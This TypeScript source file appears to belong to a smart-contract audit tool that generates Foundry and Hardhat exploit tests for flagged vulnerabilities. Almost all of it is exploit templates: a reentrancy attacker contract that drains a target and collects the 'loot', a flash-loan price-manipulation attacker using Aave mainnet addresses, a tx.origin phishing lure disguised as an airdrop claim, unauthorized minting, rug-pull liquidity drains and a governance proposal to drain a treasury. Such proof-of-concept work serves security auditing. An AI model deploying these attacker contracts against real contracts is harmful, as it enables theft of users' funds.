// ═══════════════════════════════════════════════════════════════
// SOLAY39 — Proof of Concept Exploit Generator
// /core/poc/pocGenerator.ts
// Generates executable Foundry test files for identified vulnerabilities
// These are real, runnable exploit scripts like CertiK/Trail of Bits produce
// ═══════════════════════════════════════════════════════════════

export interface PoCScript {
  id: string
  filename: string
  language: "solidity" | "javascript"
  framework: "foundry" | "hardhat"
  fullScript: string
  runCommand: string
  description: string
}

interface ContractInfo {
  name?: string
  address?: string
  hasWithdraw?: boolean
  hasDeposit?: boolean
  hasMint?: boolean
  hasSwap?: boolean
  hasFlashLoan?: boolean
  hasGovernance?: boolean
  hasProxy?: boolean
}

/**
 * Generate all applicable PoC exploit scripts based on vulnerabilities
 */
export function generatePoCScripts(
  vulnerableVectors: string[],
  contractCode: string,
  contractInfo: ContractInfo = {}
): PoCScript[] {
  const scripts: PoCScript[] = []
  const contractName = contractInfo.name || extractContractName(contractCode) || "Target"

  if (vulnerableVectors.includes("SIM-001")) {
    scripts.push(generateReentrancyPoC(contractName, contractInfo))
  }
  if (vulnerableVectors.includes("SIM-002")) {
    scripts.push(generateFlashLoanPoC(contractName, contractInfo))
  }
  if (vulnerableVectors.includes("SIM-003")) {
    scripts.push(generateAccessControlPoC(contractName, contractInfo))
  }
  if (vulnerableVectors.includes("SIM-004")) {
    scripts.push(generateMintExploitPoC(contractName, contractInfo))
  }
  if (vulnerableVectors.includes("SIM-005")) {
    scripts.push(generateLiquidityDrainPoC(contractName, contractInfo))
  }
  if (vulnerableVectors.includes("SIM-011")) {
    scripts.push(generateGovernancePoC(contractName, contractInfo))
  }

  return scripts
}

function extractContractName(code: string): string | null {
  const match = code.match(/contract\s+(\w+)/i)
  return match ? match[1] : null
}

// ══════════════════════════════════════════════════════════════════
// FOUNDRY PoC TEMPLATES
// ══════════════════════════════════════════════════════════════════

function generateReentrancyPoC(contractName: string, info: ContractInfo): PoCScript {
  const script = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Reentrancy Exploit PoC
 * @notice Solay39 Security Audit - Automated Exploit Test
 * @dev Run with: forge test --match-test testReentrancyExploit -vvvv
 */

interface ITarget {
    function deposit() external payable;
    function withdraw() external;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    ITarget public target;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _target) {
        target = ITarget(_target);
        owner = msg.sender;
        maxAttacks = 10; // Prevent infinite loops in test
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        attackCount = 0;
        
        // Step 1: Deposit to get a balance
        target.deposit{value: msg.value}();
        
        // Step 2: Trigger withdraw - this starts the reentrancy
        target.withdraw();
    }

    // Fallback triggered when target sends ETH
    receive() external payable {
        attackCount++;
        console.log("Reentry #%s, contract balance: %s", attackCount, address(target).balance);
        
        if (address(target).balance > 0 && attackCount < maxAttacks) {
            target.withdraw();
        }
    }

    function collectLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyExploitTest is Test {
    ITarget public target;
    ReentrancyAttacker public attacker;
    
    address public victim = makeAddr("victim");
    address public attackerEOA = makeAddr("attacker");
    
    uint256 constant VICTIM_DEPOSIT = 10 ether;
    uint256 constant ATTACKER_DEPOSIT = 1 ether;

    function setUp() public {
        // Deploy target contract (replace with actual deployment)
        // target = ITarget(address(new ${contractName}()));
        
        // For fork testing, use actual deployed address:
        // target = ITarget(0x...);
        
        vm.label(address(target), "${contractName}");
        
        // Setup victim with funds
        vm.deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        target.deposit{value: VICTIM_DEPOSIT}();
        
        // Deploy attacker contract
        vm.deal(attackerEOA, ATTACKER_DEPOSIT);
        vm.prank(attackerEOA);
        attacker = new ReentrancyAttacker(address(target));
    }

    function testReentrancyExploit() public {
        console.log("=== SOLAY39 REENTRANCY EXPLOIT PoC ===");
        console.log("Target balance before: %s", address(target).balance);
        console.log("Attacker balance before: %s", attackerEOA.balance);
        
        uint256 targetBalanceBefore = address(target).balance;
        
        // Execute attack
        vm.prank(attackerEOA);
        attacker.attack{value: ATTACKER_DEPOSIT}();
        
        // Collect stolen funds
        vm.prank(attackerEOA);
        attacker.collectLoot();
        
        uint256 targetBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = attackerEOA.balance;
        
        console.log("Target balance after: %s", targetBalanceAfter);
        console.log("Attacker balance after: %s", attackerBalanceAfter);
        console.log("Funds drained: %s", targetBalanceBefore - targetBalanceAfter);
        
        // Verify exploit succeeded
        assertGt(attackerBalanceAfter, ATTACKER_DEPOSIT, "Attack should profit");
        assertLt(targetBalanceAfter, targetBalanceBefore, "Target should lose funds");
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
    }

    function testReentrancyGasUsage() public {
        uint256 gasBefore = gasleft();
        
        vm.prank(attackerEOA);
        attacker.attack{value: ATTACKER_DEPOSIT}();
        
        uint256 gasUsed = gasBefore - gasleft();
        console.log("Gas used for attack: %s", gasUsed);
        
        // Typical reentrancy attack uses 200k-500k gas
        assertLt(gasUsed, 1_000_000, "Gas usage reasonable");
    }
}
`

  return {
    id: "POC-001",
    filename: "test/exploits/ReentrancyExploit.t.sol",
    language: "solidity",
    framework: "foundry",
    fullScript: script,
    runCommand: "forge test --match-test testReentrancyExploit -vvvv",
    description: "Foundry test that demonstrates reentrancy vulnerability exploitation through recursive withdraw calls."
  }
}

function generateFlashLoanPoC(contractName: string, info: ContractInfo): PoCScript {
  const script = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Flash Loan Price Manipulation PoC
 * @notice Solay39 Security Audit - Automated Exploit Test
 * @dev Run with: forge test --match-test testFlashLoanExploit -vvvv --fork-url $RPC_URL
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IFlashLoanProvider {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface ITarget {
    function getPrice() external view returns (uint256);
    function swap(uint256 amountIn, uint256 minOut) external;
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

contract FlashLoanAttacker {
    ITarget public target;
    IFlashLoanProvider public lender;
    IERC20 public token;
    address public owner;
    
    uint256 public loanAmount;
    uint256 public profit;

    constructor(address _target, address _lender, address _token) {
        target = ITarget(_target);
        lender = IFlashLoanProvider(_lender);
        token = IERC20(_token);
        owner = msg.sender;
    }

    function attack(uint256 _loanAmount) external {
        loanAmount = _loanAmount;
        
        console.log("=== INITIATING FLASH LOAN ATTACK ===");
        console.log("Loan amount: %s", _loanAmount);
        console.log("Target price before: %s", target.getPrice());
        
        // Initiate flash loan
        lender.flashLoan(address(token), _loanAmount, "");
    }

    // Flash loan callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        console.log("Flash loan received: %s", amount);
        
        // Step 1: Manipulate price by dumping tokens
        token.approve(address(target), amount);
        
        // Step 2: Execute favorable trade at manipulated price
        uint256 balanceBefore = token.balanceOf(address(this));
        target.swap(amount / 2, 0); // Dump half to move price
        
        // Step 3: Buy back at lower price
        // target.swap(...);
        
        uint256 balanceAfter = token.balanceOf(address(this));
        console.log("Target price after manipulation: %s", target.getPrice());
        
        // Repay flash loan + fee
        uint256 amountOwed = amount + premium;
        token.transfer(address(lender), amountOwed);
        
        profit = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;
        console.log("Profit from attack: %s", profit);
        
        return true;
    }

    function collectProfit() external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(owner, balance);
        }
    }
}

contract FlashLoanExploitTest is Test {
    FlashLoanAttacker public attacker;
    ITarget public target;
    
    // Mainnet addresses (update for target network)
    address constant AAVE_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    
    address public attackerEOA = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet at specific block
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"), 18_000_000);
        
        // Deploy attacker
        vm.prank(attackerEOA);
        attacker = new FlashLoanAttacker(
            address(target),
            AAVE_POOL,
            WETH
        );
    }

    function testFlashLoanExploit() public {
        console.log("=== SOLAY39 FLASH LOAN EXPLOIT PoC ===");
        
        uint256 loanAmount = 1000 ether; // Borrow 1000 WETH
        
        vm.prank(attackerEOA);
        attacker.attack(loanAmount);
        
        uint256 profit = attacker.profit();
        console.log("Total profit: %s", profit);
        
        // Verify profitability
        assertGt(profit, 0, "Attack should be profitable");
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
    }

    function testPriceManipulationImpact() public {
        console.log("=== PRICE IMPACT ANALYSIS ===");
        
        uint256 priceBefore = target.getPrice();
        console.log("Price before: %s", priceBefore);
        
        // Simulate large trade
        // ...
        
        uint256 priceAfter = target.getPrice();
        console.log("Price after: %s", priceAfter);
        
        uint256 impact = ((priceBefore - priceAfter) * 100) / priceBefore;
        console.log("Price impact: %s%%", impact);
    }
}
`

  return {
    id: "POC-002",
    filename: "test/exploits/FlashLoanExploit.t.sol",
    language: "solidity",
    framework: "foundry",
    fullScript: script,
    runCommand: "forge test --match-test testFlashLoanExploit -vvvv --fork-url $ETH_RPC_URL",
    description: "Foundry test demonstrating flash loan price manipulation attack using Aave flash loans."
  }
}

function generateAccessControlPoC(contractName: string, info: ContractInfo): PoCScript {
  const script = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Access Control Bypass PoC
 * @notice Solay39 Security Audit - Automated Exploit Test
 * @dev Run with: forge test --match-test testAccessControlBypass -vvvv
 */

interface ITarget {
    function owner() external view returns (address);
    function setOwner(address) external;
    function withdrawAll() external;
    function pause() external;
    function mint(address, uint256) external;
    function adminFunction() external;
}

contract AccessControlExploitTest is Test {
    ITarget public target;
    
    address public legitOwner = makeAddr("legitOwner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy target or connect to deployed instance
        // target = ITarget(address(new ${contractName}()));
        
        vm.label(address(target), "${contractName}");
    }

    function testAccessControlBypass() public {
        console.log("=== SOLAY39 ACCESS CONTROL BYPASS PoC ===");
        console.log("Current owner: %s", target.owner());
        console.log("Attacker address: %s", attacker);
        
        // Attempt to call admin function as non-owner
        vm.prank(attacker);
        
        // Try various admin functions
        try target.setOwner(attacker) {
            console.log("SUCCESS: setOwner() called without authorization!");
            console.log("New owner: %s", target.owner());
            assertEq(target.owner(), attacker, "Attacker is now owner");
        } catch {
            console.log("setOwner() correctly protected");
        }
        
        try target.pause() {
            console.log("SUCCESS: pause() called without authorization!");
        } catch {
            console.log("pause() correctly protected");
        }
        
        try target.withdrawAll() {
            console.log("SUCCESS: withdrawAll() called without authorization!");
        } catch {
            console.log("withdrawAll() correctly protected");
        }
        
        console.log("=== TEST COMPLETE ===");
    }

    function testTxOriginBypass() public {
        console.log("=== TX.ORIGIN PHISHING ATTACK ===");
        
        // If contract uses tx.origin for auth, this attack works
        // Attacker deploys malicious contract, tricks owner into calling it
        
        MaliciousContract malicious = new MaliciousContract(address(target));
        
        // Owner unknowingly calls malicious contract
        vm.prank(legitOwner, legitOwner); // Sets both msg.sender and tx.origin
        
        // In real attack, owner would be tricked into calling this
        // malicious.innocentLookingFunction();
        
        console.log("If tx.origin is used, attacker can hijack owner actions");
    }
}

contract MaliciousContract {
    ITarget public target;
    
    constructor(address _target) {
        target = ITarget(_target);
    }
    
    // Function that looks innocent but calls privileged function
    function claimAirdrop() external {
        // tx.origin == victim, msg.sender == this contract
        // If target checks tx.origin, this bypasses auth
        target.adminFunction();
    }
}
`

  return {
    id: "POC-003",
    filename: "test/exploits/AccessControlBypass.t.sol",
    language: "solidity",
    framework: "foundry",
    fullScript: script,
    runCommand: "forge test --match-test testAccessControlBypass -vvvv",
    description: "Foundry test checking for access control bypass and tx.origin phishing vulnerabilities."
  }
}

function generateMintExploitPoC(contractName: string, info: ContractInfo): PoCScript {
  const script = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Unlimited Mint Exploit PoC
 * @notice Solay39 Security Audit - Automated Exploit Test
 * @dev Run with: forge test --match-test testMintExploit -vvvv
 */

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface ITarget is IERC20 {
    function mint(address to, uint256 amount) external;
    function mint(uint256 amount) external;
    function owner() external view returns (address);
}

contract MintExploitTest is Test {
    ITarget public target;
    
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        // Deploy target or connect to deployed instance
        // target = ITarget(address(new ${contractName}()));
        
        // Give victim some tokens
        deal(address(target), victim, 1000 ether);
    }

    function testUnlimitedMintExploit() public {
        console.log("=== SOLAY39 MINT EXPLOIT PoC ===");
        
        uint256 supplyBefore = target.totalSupply();
        uint256 attackerBalanceBefore = target.balanceOf(attacker);
        
        console.log("Total supply before: %s", supplyBefore);
        console.log("Attacker balance before: %s", attackerBalanceBefore);
        
        // Attempt to mint as attacker (should fail if protected)
        vm.prank(attacker);
        
        try target.mint(attacker, 1_000_000 ether) {
            console.log("CRITICAL: mint() callable by anyone!");
            
            uint256 supplyAfter = target.totalSupply();
            uint256 attackerBalanceAfter = target.balanceOf(attacker);
            
            console.log("Total supply after: %s", supplyAfter);
            console.log("Attacker balance after: %s", attackerBalanceAfter);
            console.log("Tokens minted: %s", attackerBalanceAfter - attackerBalanceBefore);
            
            // Calculate inflation attack impact
            uint256 inflationPercent = ((supplyAfter - supplyBefore) * 100) / supplyBefore;
            console.log("Supply inflation: %s%%", inflationPercent);
            
            assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker minted tokens");
            
            console.log("=== EXPLOIT SUCCESSFUL ===");
        } catch {
            console.log("mint() correctly protected - SAFE");
        }
    }

    function testMintDilutionImpact() public {
        console.log("=== DILUTION ATTACK ANALYSIS ===");
        
        uint256 victimShareBefore = (target.balanceOf(victim) * 100) / target.totalSupply();
        console.log("Victim ownership before: %s%%", victimShareBefore);
        
        // If mint is exploitable, attacker dilutes all holders
        vm.prank(attacker);
        try target.mint(attacker, target.totalSupply() * 99) {
            uint256 victimShareAfter = (target.balanceOf(victim) * 100) / target.totalSupply();
            console.log("Victim ownership after: %s%%", victimShareAfter);
            console.log("Ownership diluted by: %s%%", victimShareBefore - victimShareAfter);
        } catch {}
    }
}
`

  return {
    id: "POC-004",
    filename: "test/exploits/MintExploit.t.sol",
    language: "solidity",
    framework: "foundry",
    fullScript: script,
    runCommand: "forge test --match-test testMintExploit -vvvv",
    description: "Foundry test demonstrating unauthorized minting and token supply inflation attack."
  }
}

function generateLiquidityDrainPoC(contractName: string, info: ContractInfo): PoCScript {
  const script = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Liquidity Drain Exploit PoC
 * @notice Solay39 Security Audit - Automated Exploit Test
 * @dev Run with: forge test --match-test testLiquidityDrain -vvvv
 */

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Router {
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface ITarget {
    function owner() external view returns (address);
    function removeLiquidity() external;
    function withdrawLiquidity(uint256 amount) external;
    function lpToken() external view returns (address);
}

contract LiquidityDrainTest is Test {
    ITarget public target;
    IUniswapV2Pair public pair;
    
    address public owner;
    address public attacker = makeAddr("attacker");
    
    // Mainnet addresses
    address constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    function setUp() public {
        // Fork mainnet
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        
        // Connect to target
        // target = ITarget(TARGET_ADDRESS);
        // pair = IUniswapV2Pair(target.lpToken());
        
        owner = target.owner();
    }

    function testLiquidityDrainByOwner() public {
        console.log("=== SOLAY39 LIQUIDITY DRAIN PoC ===");
        
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 totalLiquidity = pair.totalSupply();
        
        console.log("Pool reserves - Token0: %s, Token1: %s", reserve0, reserve1);
        console.log("Total LP tokens: %s", totalLiquidity);
        
        uint256 ownerLpBalance = pair.balanceOf(owner);
        console.log("Owner LP balance: %s", ownerLpBalance);
        console.log("Owner share: %s%%", (ownerLpBalance * 100) / totalLiquidity);
        
        // Check if owner can rug
        if (ownerLpBalance > totalLiquidity / 2) {
            console.log("WARNING: Owner controls >50%% of liquidity!");
            console.log("RISK: Complete liquidity drain possible");
        }
        
        // Simulate rug pull
        vm.prank(owner);
        try target.removeLiquidity() {
            console.log("Owner removed all liquidity!");
            
            (uint112 newReserve0, uint112 newReserve1,) = pair.getReserves();
            console.log("Reserves after drain - Token0: %s, Token1: %s", newReserve0, newReserve1);
            
            uint256 drainedPercent = ((reserve0 - newReserve0) * 100) / reserve0;
            console.log("Liquidity drained: %s%%", drainedPercent);
            
            console.log("=== RUG PULL SUCCESSFUL ===");
        } catch {
            console.log("Liquidity removal protected or locked");
        }
    }

    function testTimelockBypass() public {
        console.log("=== TIMELOCK ANALYSIS ===");
        
        // Check if there's a timelock on liquidity
        // Many rugs happen when timelock expires or is bypassed
        
        // Skip time to after any timelock
        vm.warp(block.timestamp + 365 days);
        
        vm.prank(owner);
        try target.withdrawLiquidity(type(uint256).max) {
            console.log("Liquidity withdrawn after timelock!");
        } catch {
            console.log("Timelock or other protection in place");
        }
    }
}
`

  return {
    id: "POC-005",
    filename: "test/exploits/LiquidityDrain.t.sol",
    language: "solidity",
    framework: "foundry",
    fullScript: script,
    runCommand: "forge test --match-test testLiquidityDrain -vvvv --fork-url $ETH_RPC_URL",
    description: "Foundry test demonstrating liquidity drain / rug pull attack vectors."
  }
}

function generateGovernancePoC(contractName: string, info: ContractInfo): PoCScript {
  const script = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Governance Attack PoC
 * @notice Solay39 Security Audit - Automated Exploit Test
 * @dev Run with: forge test --match-test testGovernanceAttack -vvvv
 */

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);
    
    function castVote(uint256 proposalId, uint8 support) external returns (uint256);
    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external payable returns (uint256);
    
    function quorum(uint256 blockNumber) external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
}

interface IToken {
    function delegate(address) external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function getPastVotes(address, uint256) external view returns (uint256);
}

contract GovernanceAttackTest is Test {
    IGovernor public governor;
    IToken public token;
    
    address public attacker = makeAddr("attacker");
    address public treasury = makeAddr("treasury");

    function setUp() public {
        // Connect to deployed governance
        // governor = IGovernor(GOVERNOR_ADDRESS);
        // token = IToken(TOKEN_ADDRESS);
        
        // Fund attacker with governance tokens
        deal(address(token), attacker, token.totalSupply() / 4);
        
        vm.prank(attacker);
        token.delegate(attacker);
        
        vm.roll(block.number + 1);
    }

    function testFlashLoanGovernanceAttack() public {
        console.log("=== SOLAY39 GOVERNANCE ATTACK PoC ===");
        
        uint256 quorumNeeded = governor.quorum(block.number - 1);
        uint256 proposalThreshold = governor.proposalThreshold();
        uint256 attackerVotes = token.getPastVotes(attacker, block.number - 1);
        
        console.log("Quorum needed: %s", quorumNeeded);
        console.log("Proposal threshold: %s", proposalThreshold);
        console.log("Attacker votes: %s", attackerVotes);
        
        if (attackerVotes >= proposalThreshold) {
            console.log("Attacker can create proposals!");
            
            // Create malicious proposal to drain treasury
            address[] memory targets = new address[](1);
            targets[0] = treasury;
            
            uint256[] memory values = new uint256[](1);
            values[0] = treasury.balance;
            
            bytes[] memory calldatas = new bytes[](1);
            calldatas[0] = "";
            
            vm.prank(attacker);
            uint256 proposalId = governor.propose(
                targets,
                values,
                calldatas,
                "Drain treasury to attacker"
            );
            
            console.log("Malicious proposal created: %s", proposalId);
            
            // Fast forward past voting delay
            vm.roll(block.number + 7200); // ~1 day
            
            // Vote
            vm.prank(attacker);
            governor.castVote(proposalId, 1); // Vote FOR
            
            console.log("Voted on proposal");
            
            if (attackerVotes >= quorumNeeded) {
                console.log("CRITICAL: Attacker has enough votes to pass proposal alone!");
                console.log("=== GOVERNANCE TAKEOVER POSSIBLE ===");
            }
        } else {
            console.log("Attacker below proposal threshold - SAFE");
        }
    }

    function testVotingPowerConcentration() public {
        console.log("=== VOTING POWER ANALYSIS ===");
        
        uint256 totalSupply = token.totalSupply();
        uint256 quorum = governor.quorum(block.number - 1);
        
        uint256 quorumPercent = (quorum * 100) / totalSupply;
        console.log("Quorum: %s%% of supply", quorumPercent);
        
        if (quorumPercent < 10) {
            console.log("WARNING: Low quorum - governance attacks easier");
        }
        
        // Check if any single address has >50% voting power
        // This would be checked against actual token holders
    }
}
`

  return {
    id: "POC-011",
    filename: "test/exploits/GovernanceAttack.t.sol",
    language: "solidity",
    framework: "foundry",
    fullScript: script,
    runCommand: "forge test --match-test testGovernanceAttack -vvvv",
    description: "Foundry test demonstrating governance takeover and flash loan voting attacks."
  }
}

/**
 * Generate a Hardhat version of the exploit tests (alternative framework)
 */
export function generateHardhatPoC(vulnerableVectors: string[], contractName: string): PoCScript {
  const script = `// Solay39 Security Audit - Hardhat Exploit Tests
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("${contractName} Exploit Tests", function () {
  let target;
  let attacker;
  let victim;

  beforeEach(async function () {
    [, attacker, victim] = await ethers.getSigners();
    
    // Deploy target contract
    // const Target = await ethers.getContractFactory("${contractName}");
    // target = await Target.deploy();
  });

  ${vulnerableVectors.includes("SIM-001") ? `
  describe("Reentrancy Attack", function () {
    it("should demonstrate reentrancy vulnerability", async function () {
      console.log("=== REENTRANCY TEST ===");
      
      // Deploy attacker contract
      const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
      const attackContract = await Attacker.connect(attacker).deploy(target.address);
      
      // Fund victim deposit
      await target.connect(victim).deposit({ value: ethers.parseEther("10") });
      
      const balanceBefore = await ethers.provider.getBalance(target.address);
      console.log("Target balance before:", ethers.formatEther(balanceBefore));
      
      // Execute attack
      await attackContract.connect(attacker).attack({ value: ethers.parseEther("1") });
      
      const balanceAfter = await ethers.provider.getBalance(target.address);
      console.log("Target balance after:", ethers.formatEther(balanceAfter));
      
      expect(balanceAfter).to.be.lt(balanceBefore);
    });
  });
  ` : ''}

  ${vulnerableVectors.includes("SIM-003") ? `
  describe("Access Control Bypass", function () {
    it("should test unauthorized function access", async function () {
      console.log("=== ACCESS CONTROL TEST ===");
      
      // Try to call admin function as attacker
      await expect(
        target.connect(attacker).adminFunction()
      ).to.be.reverted;
      
      console.log("Access control working correctly");
    });
  });
  ` : ''}

  ${vulnerableVectors.includes("SIM-004") ? `
  describe("Mint Exploit", function () {
    it("should test unauthorized minting", async function () {
      console.log("=== MINT TEST ===");
      
      const supplyBefore = await target.totalSupply();
      
      // Try to mint as attacker
      try {
        await target.connect(attacker).mint(attacker.address, ethers.parseEther("1000000"));
        console.log("CRITICAL: Unauthorized mint succeeded!");
        
        const supplyAfter = await target.totalSupply();
        expect(supplyAfter).to.be.gt(supplyBefore);
      } catch (e) {
        console.log("Mint correctly protected");
      }
    });
  });
  ` : ''}
});
`

  return {
    id: "POC-HARDHAT",
    filename: "test/exploits/ExploitTests.js",
    language: "javascript",
    framework: "hardhat",
    fullScript: script,
    runCommand: "npx hardhat test test/exploits/ExploitTests.js",
    description: "Hardhat test suite covering all identified vulnerabilities."
  }
}
